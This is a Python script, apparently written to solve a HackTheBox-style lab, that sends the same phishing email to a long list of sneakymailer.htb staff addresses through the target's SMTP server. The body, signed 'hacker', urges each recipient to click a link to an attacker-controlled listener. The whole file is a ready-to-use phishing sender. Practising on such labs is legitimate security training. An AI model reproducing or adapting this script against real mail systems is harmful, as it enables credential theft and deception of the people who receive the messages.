# Import smtplib for the actual sending function
import smtplib

# Import the email modules we'll need
from email.mime.text import MIMEText

# textfile = "./body.txt"

# Open a plain text file for reading.  For this example, assume that
# the text file contains only ASCII characters.
msg = """
Hi user,
click on this link:
http://10.10.14.17:9898/

I wait for you, it is urgent.
Yours,
hacker.
"""

me = 'hacker@hack.it'
you = ['chardemarshall@sneakymailer.htb', 'fionagreen@sneakymailer.htb', 'haleykennedy@sneakymailer.htb', 'herrodchandler@sneakymailer.htb', 'paulbyrd@sneakymailer.htb', 'sonyafrost@sneakymailer.htb', 'sulcud@sneakymailer.htb', 'sakurayamamoto@sneakymailer.htb', 'quinnflynn@sneakymailer.htb', 'tigernixon@sneakymailer.htb', 'glorialittle@sneakymailer.htb', 'laelgreer@sneakymailer.htb', 'gavincortez@sneakymailer.htb', 'prescottbartlett@sneakymailer.htb', 'bradleygreer@sneakymailer.htb', 'briellewilliamson@sneakymailer.htb', 'caesarvance@sneakymailer.htb', 'carastevens@sneakymailer.htb', 'doriswilder@sneakymailer.htb', 'hopefuentes@sneakymailer.htb', 'cedrickelly@sneakymailer.htb', 'brendenwagner@sneakymailer.htb', 'brunonash@sneakymailer.htb', 'zenaidafrank@sneakymailer.htb', 'zoritaserrano@sneakymailer.htb', 'finncamacho@sneakymailer.htb', 'olivialiang@sneakymailer.htb', 'howardhatfield@sneakymailer.htb', 'jenagaines@sneakymailer.htb', 'timothymooney@sneakymailer.htb', 'dairios@sneakymailer.htb', 'martenamccray@sneakymailer.htb', 'hermionebutler@sneakymailer.htb', 'jenniferchang@sneakymailer.htb', 'shaddecker@sneakymailer.htb', 'tatyanafitzpatrick@sneakymailer.htb', 'shouitou@sneakymailer.htb', 'jenettecaldwell@sneakymailer.htb', 'jacksonbradshaw@sneakymailer.htb', 'vivianharrell@sneakymailer.htb', 'michellehouse@sneakymailer.htb', 'rhonadavidson@sneakymailer.htb', 'colleenhurst@sneakymailer.htb', 'jenniferacosta@sneakymailer.htb', 'ashtoncox@sneakymailer.htb', 'michaelsilva@sneakymailer.htb', 'unitybutler@sneakymailer.htb', 'airisatou@sneakymailer.htb', 'garrettwinters@sneakymailer.htb', 'angelicaramos@sneakymailer.htb', 'yuriberry@sneakymailer.htb', 'donnasnider@sneakymailer.htb', 'sergebaldwin@sneakymailer.htb', 'gavinjoyce@sneakymailer.htb', 'jonasalexander@sneakymailer.htb', 'sukiburks@sneakymailer.htb', 'thorwalton@sneakymailer.htb']

# me == the sender's email address
# you == the recipient's email address
# msg['Subject'] = 'The contents of %s' % textfile
# msg['From'] = me
# msg['To'] = you

# Send the message via our own SMTP server, but don't include the
# envelope header.
for receiver in you:
	s = smtplib.SMTP('10.10.10.197')
	s.sendmail(me, receiver, msg)
	s.quit()


